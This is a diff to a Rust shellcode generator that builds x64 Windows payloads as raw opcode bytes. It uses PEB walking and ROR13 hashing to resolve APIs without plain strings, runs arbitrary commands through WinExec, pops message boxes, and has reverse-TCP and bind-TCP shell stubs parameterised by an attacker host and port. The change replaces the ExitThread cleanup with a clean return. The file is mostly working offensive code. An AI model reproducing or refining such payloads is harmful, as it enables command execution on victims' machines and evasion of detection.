@@ -174,7 +174,7 @@ fn generate_nop() -> Vec<u8> {
 //   1. Finds kernel32.dll via PEB walking (gs:[0x60] → PEB → Ldr → module list)
 //   2. Walks kernel32's export table to find WinExec by hash
 //   3. Calls WinExec(command, SW_SHOW)
-//   4. Finds and calls ExitThread(0) to clean exit
+//   4. Returns cleanly (thread runtime handles exit)
 //
 // API hashing: simple ROR13-additive hash used to identify function names
 // without embedding cleartext strings for the APIs themselves.
@@ -296,7 +296,7 @@ fn assemble(main_code: &[u8], patches: &[CallPatch]) -> Vec<u8> {
 }
 
 // ============================================================================
-// Exec payload: WinExec(command, SW_SHOW) + ExitThread(0)
+// Exec payload: WinExec(command, SW_SHOW) then return
 // ============================================================================
 const EXEC_MAX_CMD: usize = 260;
 
@@ -328,31 +328,23 @@ const MAIN_EXEC: &[u8] = &[
     0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [65]
     0x48, 0x89, 0xC7,                                         // mov rdi, rax
 
-    // Reload exports, find ExitThread (call find_function at offset 88)
-    0x8B, 0x4B, 0x18,
-    0x8B, 0x53, 0x20,
-    0x48, 0x01, 0xEA,
-    0x41, 0xBB, 0xEF, 0xCE, 0xE0, 0x60,                      // mov r11d, HASH_EXIT_THREAD
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [88]
-    0x48, 0x89, 0xC6,                                         // mov rsi, rax
-
-    // Get data ptr, call WinExec (call get_data_ptr at offset 96)
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call get_data_ptr [96]
+    // Get data ptr (call get_data_ptr at offset 73)
+    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call get_data_ptr [73]
     0x48, 0x89, 0xC1,                                         // mov rcx, rax
     0xBA, 0x05, 0x00, 0x00, 0x00,                             // mov edx, 5 (SW_SHOW)
     0xFF, 0xD7,                                               // call rdi
 
-    // ExitThread(0)
-    0x48, 0x31, 0xC9,                                         // xor rcx, rcx
-    0xFF, 0xD6,                                               // call rsi
+    // Clean return — let thread runtime handle exit
+    0x48, 0x83, 0xC4, 0x28,                                   // add rsp, 0x28
+    0x31, 0xC0,                                               // xor eax, eax
+    0xC3,                                                     // ret
 ];
-// 116 bytes; patches at 65, 88, 96
+// 95 bytes; patches at 65, 73
 
 fn generate_exec(command: &str) -> Result<Vec<u8>, String> {
     let mut sc = assemble(MAIN_EXEC, &[
         CallPatch { offset: 65, target: CallTarget::FindFunction },
-        CallPatch { offset: 88, target: CallTarget::FindFunction },
-        CallPatch { offset: 96, target: CallTarget::GetDataPtr },
+        CallPatch { offset: 73, target: CallTarget::GetDataPtr },
     ]);
     let mut cmd_buf = vec![0u8; EXEC_MAX_CMD];
     let cmd_bytes = command.as_bytes();
@@ -397,16 +389,8 @@ const MAIN_MSGBOX: &[u8] = &[
     0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [65]
     0x49, 0x89, 0xC4,                                         // mov r12, rax
 
-    // Reload exports, find ExitThread [88]
-    0x8B, 0x4B, 0x18,
-    0x8B, 0x53, 0x20,
-    0x48, 0x01, 0xEA,
-    0x41, 0xBB, 0xEF, 0xCE, 0xE0, 0x60,                      // mov r11d, HASH_EXIT_THREAD
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [88]
-    0x49, 0x89, 0xC5,                                         // mov r13, rax
-
-    // Get data section pointer [96]
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call get_data_ptr [96]
+    // Get data section pointer [73]
+    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call get_data_ptr [73]
     0x49, 0x89, 0xC6,                                         // mov r14, rax
 
     // LoadLibraryA("user32.dll") at data + 256
@@ -425,9 +409,9 @@ const MAIN_MSGBOX: &[u8] = &[
     0x8B, 0x50, 0x20,
     0x48, 0x01, 0xEA,
 
-    // Find MessageBoxA in user32 [153]
+    // Find MessageBoxA in user32 [130]
     0x41, 0xBB, 0xA8, 0xA2, 0x4D, 0xBC,                      // mov r11d, HASH_MESSAGEBOXA
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [153]
+    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [130]
 
     // MessageBoxA(NULL, text, title, MB_OK)
     0x48, 0x89, 0xC7,                                         // mov rdi, rax
@@ -438,18 +422,18 @@ const MAIN_MSGBOX: &[u8] = &[
     0x4D, 0x31, 0xC9,                                         // xor r9, r9         ; MB_OK
     0xFF, 0xD7,                                               // call rdi
 
-    // ExitThread(0)
-    0x48, 0x31, 0xC9,
-    0x41, 0xFF, 0xD5,
+    // Clean return
+    0x48, 0x83, 0xC4, 0x28,                                   // add rsp, 0x28
+    0x31, 0xC0,                                               // xor eax, eax
+    0xC3,                                                     // ret
 ];
-// 188 bytes; patches at 65, 88, 96, 153
+// 166 bytes; patches at 65, 73, 130
 
 fn generate_messagebox(title: &str, text: &str) -> Result<Vec<u8>, String> {
     let mut sc = assemble(MAIN_MSGBOX, &[
         CallPatch { offset: 65, target: CallTarget::FindFunction },
-        CallPatch { offset: 88, target: CallTarget::FindFunction },
-        CallPatch { offset: 96, target: CallTarget::GetDataPtr },
-        CallPatch { offset: 153, target: CallTarget::FindFunction },
+        CallPatch { offset: 73, target: CallTarget::GetDataPtr },
+        CallPatch { offset: 130, target: CallTarget::FindFunction },
     ]);
     let mut title_buf = vec![0u8; MSGBOX_TITLE_SIZE];
     let mut text_buf = vec![0u8; MSGBOX_TEXT_SIZE];
@@ -507,19 +491,12 @@ const MAIN_SHELL_STUB: &[u8] = &[
     0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [88]
     0x49, 0x89, 0xC5,                                         // r13 = CreateProcessA
 
-    // Reload, find ExitThread [111]
-    0x8B, 0x4B, 0x18,
-    0x8B, 0x53, 0x20,
-    0x48, 0x01, 0xEA,
-    0x41, 0xBB, 0xEF, 0xCE, 0xE0, 0x60,
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [111]
-    0x49, 0x89, 0xC6,                                         // r14 = ExitThread
-
-    // Stub: clean exit (socket logic not yet implemented)
-    0x48, 0x31, 0xC9,                                         // xor rcx, rcx
-    0x41, 0xFF, 0xD6,                                         // call r14
+    // Clean return (socket logic not yet implemented)
+    0x48, 0x83, 0xC4, 0x50,                                   // add rsp, 0x50
+    0x31, 0xC0,                                               // xor eax, eax
+    0xC3,                                                     // ret
 ];
-// 125 bytes; patches at 65, 88, 111
+// 103 bytes; patches at 65, 88
 
 const REVTCP_FAMILY_OFFSET: usize = 0;
 const REVTCP_PORT_OFFSET: usize = 2;
@@ -532,7 +509,6 @@ fn generate_reverse_tcp(lhost: &str, lport: u16) -> Result<Vec<u8>, String> {
     let mut sc = assemble(MAIN_SHELL_STUB, &[
         CallPatch { offset: 65, target: CallTarget::FindFunction },
         CallPatch { offset: 88, target: CallTarget::FindFunction },
-        CallPatch { offset: 111, target: CallTarget::FindFunction },
     ]);
     let mut sockaddr = [0u8; 16];
     sockaddr[REVTCP_FAMILY_OFFSET] = 0x02;
@@ -556,7 +532,6 @@ fn generate_bind_tcp(lport: u16) -> Result<Vec<u8>, String> {
     let mut sc = assemble(MAIN_SHELL_STUB, &[
         CallPatch { offset: 65, target: CallTarget::FindFunction },
         CallPatch { offset: 88, target: CallTarget::FindFunction },
-        CallPatch { offset: 111, target: CallTarget::FindFunction },
     ]);
     let mut sockaddr = [0u8; 16];
     sockaddr[0] = 0x02;
@@ -588,7 +563,7 @@ pub fn print_info(log: &LogSink) {
     log.detail("  1. Walks the PEB (Process Environment Block) to find kernel32.dll");
     log.detail("  2. Parses the PE export table to resolve API functions by hash");
     log.detail("  3. Calls the target API (WinExec, MessageBoxA, WSASocketA, etc.)");
-    log.detail("  4. Cleans up with ExitThread(0)");
+    log.detail("  4. Returns cleanly (thread runtime handles exit)");
     log.info("");
     log.detail("PEB walking technique (x64):");
     log.detail("  gs:[0x60] → PEB → PEB_LDR_DATA → InMemoryOrderModuleList");
